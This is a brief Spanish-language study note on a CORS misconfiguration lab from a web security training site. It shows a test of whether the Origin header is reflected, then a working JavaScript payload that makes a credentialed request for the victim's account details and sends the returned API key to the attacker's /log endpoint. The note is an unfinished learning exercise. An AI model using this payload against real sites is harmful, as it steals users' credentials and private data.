
Como tal CORS es un mecanismo de busqueda que controla el acceso a recursos fuera de un dominio

## Origin

1. Probar a cambiar el Origin y ver si se refleja en la response 

Request
```
Origin: http://caca.com
```
Response
```
Access-Control-Allow-Origin: http://caca.com
```

En este caso si se refleja, ahora en vez de caca.com pondremos nuestro exploit server.

Luego en el server hay que escribir un código para robar los datos sensibles, en el caso de este laboratorio son la API key :

```
<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script>
```



continuare cuando sepa html xd
